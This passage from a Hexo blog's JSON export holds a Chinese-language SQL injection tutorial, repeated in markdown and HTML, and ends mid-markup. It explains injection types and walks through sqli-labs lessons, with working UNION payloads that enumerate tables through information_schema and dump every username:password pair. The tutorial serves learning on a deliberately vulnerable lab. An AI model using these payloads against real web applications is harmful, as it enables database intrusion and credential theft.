单引号闭合的，于是将其拆分 '   '1'' LIMIT 0,1   '，可知报错的段落是 '1'' LIMIT 0,1,由于我们输入的id值是1'\n\n,所以再拆分一下为'   1'   ' LIMIT 0,1\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id = '$id' limit 0,1 \"\n```\n\n id被单引号包裹，这是字符型注入点\n\n##### less-2\n\n![](/img/less-2.png)\n\n流程与上面差不多\n\n不同的是，这次输入id=1'后报错为 '' LIMIT 0,1'\n\n还是用和上面一样的方法拆分这段 ，'     ' LIMIT 0,1      '  -->' LIMIT 0,1\n\n可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id =$ id limit 0,1 \"\n```\n\nid没有被单引号包裹，这是一个数字型注入点\n\n##### less-3\n\n![](/img/less-3.png)\n\n这次的报错是 ''1'') LIMIT 0,1'\n\n拆分 '   '1'') LIMIT 0,1   '-->'1'') LIMIT 0,1-->'   *1'*   ') LIMIT 0,1\n\n显然，后台语句是\n\n```mysql\n\"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 \"\n```\n\n但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了\n\n比如上面这个less-3\n\n我们试着把输入改为 id=1') --+或id=1') --%20\n\n![](/img/--+.png)\n\n![](/img/-- .png)\n\n都成功了，这就说明后台语句和我们想的八九不离十了\n\n##### less-4\n\n这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被\"\"包裹了，输入的id值都会被当作字符串，加单引号括号都没用。\n\n那就使用\\来制造报错，输入 id=1\\\n\n返回报错 '\"1\\\\\") LIMIT 0,1'-->\"1\\\\\") LIMIT 0,1\n\n\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错\n\n合理推测：\n\n```mysql\n\"SELECT username,password FROM user WHERE id = (\"id\") limit 0,1 \"\n```\n\n验证：\n\n![](/img/less-4.png)\n\n这样4种不同的注入点的后台语句就通过报错大致的试出来了\n\n之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等\n\n例如less-1(字符型) 就可以输入?id=1' order by 1(,2,3,4... ) --+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用\n\nless-1能够order by到3，也就是它有3个字段，于是接下来union注入\n\n我们要构造的语句是SELECT username,password FROM user WHERE id = '0' union select 1,2,3 --+ limit 0,1\n\n所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0' union select 1,2,3 --+\n\n这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果\n\n效果\n\n![](/img/union注入.png)\n\n可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用\n\n于是接下来注入 id=0' union select 1,user(),database() --+\n\n![](/img/union爆库.png)\n\n爆出了用户名和使用的数据库名\n\n然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入\n\n例如：\n\n爆表：\n\n```mysql\nid=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+\n```\n\n​\t\t\tinformation_schema是储存了所有数据库信息的库，tables储存了所有表信息的表\n\n![](/img/union爆表.png)\n\n看到了最后一个表是'users',可用于下一步爆字段\n\n爆字段：\n\n```mysql\nid=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+\n```\n\n![](/img/union爆字段.png)\n\n爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了\n\n```mysql\nid=0' union select 1,group_concat(username,0x3a,password),3 from users --+\n```\n\n![](E:/文档/Github仓库/LiGuHeiYi/LiGuHeiYi.github.io/_posts/img/union爆出账号密码.png)\n\n好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了","source":"_posts/2020-10-14-SQL注入总结（持续更新）.md","raw":"---\nlayout: post\ntitle: SQL注入总结\ndate: 2020-10-14\ncategories: blog\ntags: [web,漏洞]\ndescription: 注，都可以注~\n---\n\n# SQL注入总结（持续更新）\n\n## SQL注入 \n\nSQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。\n\n由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型\n\n> 按照注入点类型来分类\n\n### （1）数字型注入点\n\n许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。\n\n这一类的 SQL 语句原型大概为 `select * from 表名 where id=1 ` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where id=1 and 1=1`\n\n### （2）字符型注入点\n\n网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。\n\n若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where name='admin' and 1=1 '` 我们需要将这些烦人的引号给处理掉。\n\n### （3）搜索型注入点\n\n这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `\"keyword=关键字\"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。\n\n此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`\n\n> 按照数据提交的方式来分类\n\n### （1）GET 注入\n\n提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接http://xxx.com/index.php?id=1 , id 是注入点。\n\n### （2）POST 注入\n\n使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。\n\n### （3）Cookie 注入\n\nHTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。\n\n### （4）HTTP 头部注入\n\n注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。\n\n> 按照执行效果来分类\n\n### （1）基于布尔的盲注\n\n即可以根据返回页面判断条件真假的注入。\n\n### （2）基于时间的盲注\n\n即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。\n\n### （3）基于报错注入\n\n即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。\n\n1. 单引号\n2. 双引号\n3. 基于数字型注入\n\n### （4）联合查询注入\n\n可以使用union的情况下的注入。\n\n### （5）堆查询注入\n\n可以同时执行多条语句的执行时的注入。\n\n### （6）宽字节注入\n\n宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）\n\n### 基于sqli-labs的实践操作\n\n#### 1.基于报错的GET sql注入\n\n##### less-1\n\n![](/img/less-1.png)\n\n提示说输入一个数字作为ID的值\n\n那么先在url输入?id=1\n\n![](/img/less-1输入id=1.png)\n\n显示查询成功，返回了用户Dumb\n\n然后尝试使其报错，输入 ?id=1'\n\n![](/img/less-1输入id-1'.png)\n\n报错了，显示为 ''1'' LIMIT 0,1'\n\n有了这个，我们就可以揣测一下网站后端的sql请求语句了\n\n首先，这个报错语句是被 ' ' 单引号闭合的，于是将其拆分 '   '1'' LIMIT 0,1   '，可知报错的段落是 '1'' LIMIT 0,1,由于我们输入的id值是1'\n\n,所以再拆分一下为'   1'   ' LIMIT 0,1\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id = '$id' limit 0,1 \"\n```\n\n id被单引号包裹，这是字符型注入点\n\n##### less-2\n\n![](/img/less-2.png)\n\n流程与上面差不多\n\n不同的是，这次输入id=1'后报错为 '' LIMIT 0,1'\n\n还是用和上面一样的方法拆分这段 ，'     ' LIMIT 0,1      '  -->' LIMIT 0,1\n\n可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去\n\n由此可以看出后台语句大致是 \n\n```mysql\n\"SELECT username,password FROM user WHERE id =$ id limit 0,1 \"\n```\n\nid没有被单引号包裹，这是一个数字型注入点\n\n##### less-3\n\n![](/img/less-3.png)\n\n这次的报错是 ''1'') LIMIT 0,1'\n\n拆分 '   '1'') LIMIT 0,1   '-->'1'') LIMIT 0,1-->'   *1'*   ') LIMIT 0,1\n\n显然，后台语句是\n\n```mysql\n\"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 \"\n```\n\n但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了\n\n比如上面这个less-3\n\n我们试着把输入改为 id=1') --+或id=1') --%20\n\n![](/img/--+.png)\n\n![](/img/-- .png)\n\n都成功了，这就说明后台语句和我们想的八九不离十了\n\n##### less-4\n\n这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被\"\"包裹了，输入的id值都会被当作字符串，加单引号括号都没用。\n\n那就使用\\来制造报错，输入 id=1\\\n\n返回报错 '\"1\\\\\") LIMIT 0,1'-->\"1\\\\\") LIMIT 0,1\n\n\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错\n\n合理推测：\n\n```mysql\n\"SELECT username,password FROM user WHERE id = (\"id\") limit 0,1 \"\n```\n\n验证：\n\n![](/img/less-4.png)\n\n这样4种不同的注入点的后台语句就通过报错大致的试出来了\n\n之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等\n\n例如less-1(字符型) 就可以输入?id=1' order by 1(,2,3,4... ) --+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用\n\nless-1能够order by到3，也就是它有3个字段，于是接下来union注入\n\n我们要构造的语句是SELECT username,password FROM user WHERE id = '0' union select 1,2,3 --+ limit 0,1\n\n所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0' union select 1,2,3 --+\n\n这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果\n\n效果\n\n![](/img/union注入.png)\n\n可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用\n\n于是接下来注入 id=0' union select 1,user(),database() --+\n\n![](/img/union爆库.png)\n\n爆出了用户名和使用的数据库名\n\n然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入\n\n例如：\n\n爆表：\n\n```mysql\nid=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+\n```\n\n​\t\t\tinformation_schema是储存了所有数据库信息的库，tables储存了所有表信息的表\n\n![](/img/union爆表.png)\n\n看到了最后一个表是'users',可用于下一步爆字段\n\n爆字段：\n\n```mysql\nid=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+\n```\n\n![](/img/union爆字段.png)\n\n爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了\n\n```mysql\nid=0' union select 1,group_concat(username,0x3a,password),3 from users --+\n```\n\n![](E:/文档/Github仓库/LiGuHeiYi/LiGuHeiYi.github.io/_posts/img/union爆出账号密码.png)\n\n好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了","slug":"2020-10-14-SQL注入总结（持续更新）","published":1,"updated":"2020-10-14T15:43:34.873Z","comments":1,"photos":[],"link":"","_id":"ckkntx9jl000oxov7m890sqeb","content":"<h1 id=\"SQL注入总结（持续更新）\"><a href=\"#SQL注入总结（持续更新）\" class=\"headerlink\" title=\"SQL注入总结（持续更新）\"></a>SQL注入总结（持续更新）</h1><h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。</p>\n<p>由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型</p>\n<blockquote>\n<p>按照注入点类型来分类</p>\n</blockquote>\n<h3 id=\"（1）数字型注入点\"><a href=\"#（1）数字型注入点\" class=\"headerlink\" title=\"（1）数字型注入点\"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href=\"http://xxx.com/users.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p>\n<p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p>\n<h3 id=\"（2）字符型注入点\"><a href=\"#（2）字符型注入点\" class=\"headerlink\" title=\"（2）字符型注入点\"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href=\"http://xxx.com/users.php?name=admin\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p>\n<p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name='admin' and 1=1 '</code> 我们需要将这些烦人的引号给处理掉。</p>\n<h3 id=\"（3）搜索型注入点\"><a href=\"#（3）搜索型注入点\" class=\"headerlink\" title=\"（3）搜索型注入点\"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>\"keyword=关键字\"</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p>\n<p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'</code></p>\n<blockquote>\n<p>按照数据提交的方式来分类</p>\n</blockquote>\n<h3 id=\"（1）GET-注入\"><a href=\"#（1）GET-注入\" class=\"headerlink\" title=\"（1）GET 注入\"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href=\"http://xxx.com/index.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/index.php?id=1</a> , id 是注入点。</p>\n<h3 id=\"（2）POST-注入\"><a href=\"#（2）POST-注入\" class=\"headerlink\" title=\"（2）POST 注入\"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>\n<h3 id=\"（3）Cookie-注入\"><a href=\"#（3）Cookie-注入\" class=\"headerlink\" title=\"（3）Cookie 注入\"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>\n<h3 id=\"（4）HTTP-头部注入\"><a href=\"#（4）HTTP-头部注入\" class=\"headerlink\" title=\"（4）HTTP 头部注入\"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>\n<blockquote>\n<p>按照执行效果来分类</p>\n</blockquote>\n<h3 id=\"（1）基于布尔的盲注\"><a href=\"#（1）基于布尔的盲注\" class=\"headerlink\" title=\"（1）基于布尔的盲注\"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p>\n<h3 id=\"（2）基于时间的盲注\"><a href=\"#（2）基于时间的盲注\" class=\"headerlink\" title=\"（2）基于时间的盲注\"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>\n<h3 id=\"（3）基于报错注入\"><a href=\"#（3）基于报错注入\" class=\"headerlink\" title=\"（3）基于报错注入\"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<ol>\n<li>单引号</li>\n<li>双引号</li>\n<li>基于数字型注入</li>\n</ol>\n<h3 id=\"（4）联合查询注入\"><a href=\"#（4）联合查询注入\" class=\"headerlink\" title=\"（4）联合查询注入\"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p>\n<h3 id=\"（5）堆查询注入\"><a href=\"#（5）堆查询注入\" class=\"headerlink\" title=\"（5）堆查询注入\"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p>\n<h3 id=\"（6）宽字节注入\"><a href=\"#（6）宽字节注入\" class=\"headerlink\" title=\"（6）宽字节注入\"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p>\n<h3 id=\"基于sqli-labs的实践操作\"><a href=\"#基于sqli-labs的实践操作\" class=\"headerlink\" title=\"基于sqli-labs的实践操作\"></a>基于sqli-labs的实践操作</h3><h4 id=\"1-基于报错的GET-sql注入\"><a href=\"#1-基于报错的GET-sql注入\" class=\"headerlink\" title=\"1.基于报错的GET sql注入\"></a>1.基于报错的GET sql注入</h4><h5 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h5><p><img src=\"/img/less-1.png\" alt=\"\"></p>\n<p>提示说输入一个数字作为ID的值</p>\n<p>那么先在url输入?id=1</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id=1.png\" alt=\"\"></p>\n<p>显示查询成功，返回了用户Dumb</p>\n<p>然后尝试使其报错，输入 ?id=1’</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id-1'.png\" alt=\"\"></p>\n<p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p>\n<p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p>\n<p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p>\n<p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id = '$id' limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p> id被单引号包裹，这是字符型注入点</p>\n<h5 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h5><p><img src=\"/img/less-2.png\" alt=\"\"></p>\n<p>流程与上面差不多</p>\n<p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p>\n<p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p>\n<p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id =$ id limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>id没有被单引号包裹，这是一个数字型注入点</p>\n<h5 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h5><p><img src=\"/img/less-3.png\" alt=\"\"></p>\n<p>这次的报错是 ‘’1’’) LIMIT 0,1’</p>\n<p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p>\n<p>显然，后台语句是</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p>\n<p>比如上面这个less-3</p>\n<p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p>\n<p><img src=\"/img/--+.png\" alt=\"\"></p>\n<p>![](/img/– .png)</p>\n<p>都成功了，这就说明后台语句和我们想的八九不离十了</p>\n<h5 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p>\n<p>那就使用\\来制造报错，输入 id=1\\</p>\n<p>返回报错 ‘“1\\“) LIMIT 0,1’–&gt;”1\\“) LIMIT 0,1</p>\n<p>\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p>\n<p>合理推测：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">\"SELECT username,password FROM user WHERE id = (\"id\") limit 0,1 \"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>验证：</p>\n<p><img src=\"/img/less-4.png\" alt=\"\"></p>\n<p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p>\n<p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p>\n<p>例如less-1(字符型) 就可以输入?id=1’ order by 1(,2,3,4… ) –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p>\n<p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p>\n<p>我们要构造的语句是SELECT username,password FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p>\n<p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p>\n<p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p>\n<p>效果</p>\n<p><img src=\"/img/union%E6%B3%A8%E5%85%A5.png\" alt=\"\"></p>\n<p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p>\n<p>于是接下来注入 id=0’ union select 1,user(),database() –+</p>\n<p><img src=\"/img/union%E7%88%86%E5%BA%93.png\" alt=\"\"></p>\n<p>爆出了用户名和使用的数据库名</p>\n<p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p>\n<p>例如：</p>\n<p>爆表：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p>\n<p><img src=\"/img/union%E7%88%86%E8%A1%A8.png\" alt=\"\"></p>\n<p>看到了最后一个表是’users’,可用于下一步爆字段</p>\n<p>爆字段：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png\" alt=\"\"></p>\n<p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">id=0' union select 1,group_concat(username,0x3a,password),3 from users --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"E:/%E6%96%87%E6%A1%A3/Github%E4%BB%93%E5%BA%93/LiGuHeiYi/LiGuHeiYi.github.io/_posts/img/union%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png\" alt=\"\"></p>\n<p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"SQL注入总结（持续更新）\"><a href=\"#SQL注入总结（持续更新）\" class=\"headerlink\" title=\"SQL注入总结（持续更新）\"></a>SQL注入总结（持续更新）</h1><h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。</p>\n<p>由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型</p>\n<blockquote>\n<p>按照注入点类型来分类</p>\n</blockquote>\n<h3 id=\"（1）数字型注入点\"><a href=\"#（1）数字型注入点\" class=\"headerlink\" title=\"（1）数字型注入点\"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href=\"http://xxx.com/users.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p>\n<p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p>\n<h3 id=\"（2）字符型注入点\"><a href=\"#（2）字符型注入点\" class=\"headerlink\" title=\"（2）字符型注入点\"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href=\"http://xxx.com/users.php?name=admin\" 